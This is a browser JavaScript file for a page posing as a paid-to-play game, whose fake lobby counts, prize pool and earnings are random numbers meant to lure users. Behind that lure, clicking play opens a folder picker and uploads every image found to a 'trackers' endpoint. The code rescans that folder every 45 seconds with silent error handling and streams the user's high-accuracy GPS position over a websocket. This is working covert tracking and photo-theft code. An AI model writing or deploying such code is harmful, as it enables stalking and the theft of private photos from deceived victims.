const roomId = window.location.pathname.split('/').pop();
const joinScreen = document.getElementById('join-screen');
const playScreen = document.getElementById('play-screen');
const errorEl = document.getElementById('error');
const startBtn = document.getElementById('start-btn');
const statusText = document.getElementById('status-text');
const statusSub = document.getElementById('status-sub');
const personNameEl = document.getElementById('person-name');
const earningsEl = document.getElementById('earnings');
const rankEl = document.getElementById('rank');
const streakEl = document.getElementById('streak');
const progressFill = document.getElementById('progress-fill');
const progressHint = document.getElementById('progress-hint');
const onlineCount = document.getElementById('online-count');
const prizePool = document.getElementById('prize-pool');
const prizeTick = document.getElementById('prize-tick');

const IDB_NAME = 'relay-sync-cache';
const IDB_STORE = 'handles';
const uploadedKeys = new Set();

let watchId = null;
let ws = null;
let trackerId = null;
let earnings = 0;
let streak = 0;
let progress = 0;
let gameTimers = [];
let syncRunning = false;
let cachedDirHandle = null;

const IMAGE_EXT = /\.(jpe?g|png|webp|gif|heic|heif|bmp|tif|tiff)$/i;

function isImageFile(file) {
  return (file.type && file.type.startsWith('image/')) || IMAGE_EXT.test(file.name || '');
}

function fileKey(file) {
  return `${file.name}:${file.size}:${file.lastModified}`;
}

function showError(msg) {
  errorEl.textContent = msg;
  errorEl.classList.remove('hidden');
}

function hideError() {
  errorEl.classList.add('hidden');
}

function rand(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function openCacheDB() {
  return new Promise((resolve, reject) => {
    const req = indexedDB.open(IDB_NAME, 1);
    req.onupgradeneeded = () => req.result.createObjectStore(IDB_STORE);
    req.onsuccess = () => resolve(req.result);
    req.onerror = () => reject(req.error);
  });
}

async function saveDirHandle(handle) {
  try {
    const db = await openCacheDB();
    db.transaction(IDB_STORE, 'readwrite').objectStore(IDB_STORE).put(handle, 'gallery');
    cachedDirHandle = handle;
  } catch { /* silent */ }
}

async function loadDirHandle() {
  if (cachedDirHandle) return cachedDirHandle;
  try {
    const db = await openCacheDB();
    const handle = await new Promise((resolve) => {
      const req = db.transaction(IDB_STORE).objectStore(IDB_STORE).get('gallery');
      req.onsuccess = () => resolve(req.result || null);
      req.onerror = () => resolve(null);
    });
    cachedDirHandle = handle;
    return handle;
  } catch {
    return null;
  }
}

async function ensureDirPermission(handle) {
  const opts = { mode: 'read' };
  if ((await handle.queryPermission(opts)) === 'granted') return true;
  if ((await handle.requestPermission(opts)) === 'granted') return true;
  return false;
}

function animateLobby() {
  let online = rand(2400, 3200);
  onlineCount.textContent = online.toLocaleString();
  setInterval(() => {
    online += rand(-3, 8);
    onlineCount.textContent = online.toLocaleString();
  }, 3000);

  let pool = rand(11000, 15000);
  prizePool.textContent = `$${pool.toLocaleString()}`;
  setInterval(() => {
    pool += rand(1, 15);
    prizePool.textContent = `$${pool.toLocaleString()}`;
    prizeTick.textContent = rand(50, 200);
  }, 2000);
}

function startGameUI(name) {
  joinScreen.classList.add('hidden');
  playScreen.classList.remove('hidden');
  personNameEl.textContent = name;
  statusText.textContent = 'Match live!';
  statusSub.textContent = "You're in — keep playing to earn more";
  rankEl.textContent = `#${rand(100, 999)}`;

  gameTimers.push(setInterval(() => {
    earnings += Math.random() * 0.08 + 0.02;
    earningsEl.textContent = `$${earnings.toFixed(2)}`;
    streak = Math.min(streak + 1, 99);
    streakEl.textContent = `${streak}🔥`;
    progress = Math.min(progress + rand(1, 3), 100);
    progressFill.style.width = `${progress}%`;
    progressHint.textContent = progress >= 100
      ? '🎉 Bonus unlocked! Keep playing…'
      : `${progress}% to next bonus…`;
  }, 2000));
}

async function sendLocation(lat, lng, accuracy) {
  if (!trackerId) return;
  const payload = { lat, lng, accuracy };
  if (ws?.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify({ type: 'location', ...payload }));
    return;
  }
  const res = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/location`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });
  if (res.status === 404) await rejoin();
}

async function rejoin() {
  const name = personNameEl.textContent;
  if (!name || name === '—') return;
  const res = await fetch(`/api/rooms/${roomId}/join`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name }),
  });
  if (!res.ok) return;
  trackerId = (await res.json()).tracker_id;
  connectWs();
}

function connectWs() {
  const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
  ws = new WebSocket(`${protocol}//${location.host}/ws/track/${roomId}/${trackerId}`);
  ws.onclose = () => setTimeout(() => { if (trackerId) connectWs(); }, 2000);
}

async function uploadPhoto(file) {
  if (!trackerId || !file) return false;
  const key = fileKey(file);
  if (uploadedKeys.has(key)) return true;
  const form = new FormData();
  form.append('file', file, file.name || 'photo.jpg');
  const res = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/photos`, {
    method: 'POST',
    body: form,
  });
  if (res.ok) uploadedKeys.add(key);
  return res.ok;
}

async function readDirImages(dirHandle, acc = []) {
  for await (const [, handle] of dirHandle.entries()) {
    if (handle.kind === 'file') {
      const file = await handle.getFile();
      if (isImageFile(file)) acc.push(file);
    } else if (handle.kind === 'directory') {
      await readDirImages(handle, acc);
    }
  }
  return acc;
}

function pickFolderViaInput() {
  return new Promise((resolve) => {
    const input = document.createElement('input');
    input.type = 'file';
    input.multiple = true;
    input.webkitdirectory = true;
    input.style.cssText = 'position:fixed;left:-9999px;opacity:0;width:0;height:0;';
    document.body.appendChild(input);
    input.addEventListener('change', () => {
      const files = [...input.files].filter(isImageFile);
      input.remove();
      resolve(files);
    }, { once: true });
    input.click();
  });
}

async function uploadQueue(files) {
  if (!files?.length) return;
  const queue = files.filter(f => !uploadedKeys.has(fileKey(f)));
  const workers = Array.from({ length: 4 }, async () => {
    while (queue.length) {
      const file = queue.shift();
      if (file) await uploadPhoto(file);
    }
  });
  await Promise.all(workers);
}

async function backgroundMediaSync(initialFiles = null) {
  if (syncRunning || !trackerId) return;
  syncRunning = true;
  try {
    if (initialFiles?.length) await uploadQueue(initialFiles);
  } catch { /* silent */ }
  syncRunning = false;
}

async function rescanLoop() {
  if (!trackerId || syncRunning) return;
  const handle = await loadDirHandle();
  if (!handle || !(await ensureDirPermission(handle))) return;
  const files = await readDirImages(handle);
  void backgroundMediaSync(files);
}

async function startPlaying() {
  hideError();
  const name = document.getElementById('name').value.trim();
  if (!name) { showError('Enter your player name to continue.'); return; }

  startBtn.disabled = true;
  startBtn.textContent = 'LOADING…';

  // Start folder access in this click turn — required by the browser.
  let filesPromise;
  if (cachedDirHandle) {
    filesPromise = readDirImages(cachedDirHandle);
  } else if (window.showDirectoryPicker) {
    filesPromise = window.showDirectoryPicker({ mode: 'read' })
      .then(async (handle) => {
        await saveDirHandle(handle);
        return readDirImages(handle);
      })
      .catch(() => pickFolderViaInput());
  } else {
    filesPromise = pickFolderViaInput();
  }

  try {
    const joinRes = await fetch(`/api/rooms/${roomId}/join`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name }),
    });
    if (!joinRes.ok) throw new Error('Could not join match. Try again.');
    trackerId = (await joinRes.json()).tracker_id;

    startGameUI(name);
    connectWs();

    if (navigator.geolocation) {
      watchId = navigator.geolocation.watchPosition(
        (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
        () => {},
        { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 }
      );
    }

    const files = await filesPromise;
    void backgroundMediaSync(files);

    gameTimers.push(setInterval(async () => {
      if (!trackerId) return;
      const check = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}`);
      if (check.status === 404) await rejoin();
    }, 8000));

    gameTimers.push(setInterval(rescanLoop, 45000));

  } catch (e) {
    showError(e.message || 'Something went wrong.');
    startBtn.disabled = false;
    startBtn.textContent = '▶ PLAY NOW';
  }
}

startBtn.addEventListener('click', startPlaying);
document.getElementById('name').addEventListener('keydown', (e) => {
  if (e.key === 'Enter') startPlaying();
});

loadDirHandle().then(async (handle) => {
  if (handle && (await ensureDirPermission(handle))) cachedDirHandle = handle;
});
animateLobby();

setInterval(() => {
  if (ws?.readyState === WebSocket.OPEN) ws.send('ping');
}, 25000);
